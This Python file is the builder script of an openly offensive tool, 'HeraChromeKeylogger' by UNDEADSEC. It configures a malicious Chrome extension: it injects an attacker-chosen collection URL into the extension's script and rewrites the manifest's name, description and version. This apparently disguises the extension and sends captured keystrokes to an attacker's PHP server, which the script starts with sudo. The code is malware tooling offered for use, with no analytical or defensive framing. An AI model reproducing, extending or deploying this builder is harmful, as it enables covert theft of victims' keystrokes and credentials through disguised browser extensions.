######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################
from json import load, dump
from os import system

def build(prefix, domain):
    with open('MaliciousExtension/temis.js', 'r+') as f:
        content = f.read()
        f.seek(0, 0)
        f.write('var url = \'' + prefix + domain + '\';' + '\n' + content)

def editMan(newName, newDesc, newVersion):
    with open('MaliciousExtension/manifest.json', 'r+') as f:
        data = load(f)
        data['name'] = newName
        data['description'] = newDesc
        data['version'] = newVersion
        f.seek(0)
        dump(data, f, indent=4)
        f.truncate()

def runServer():
    system("sudo php -S 127.0.0.1:80")

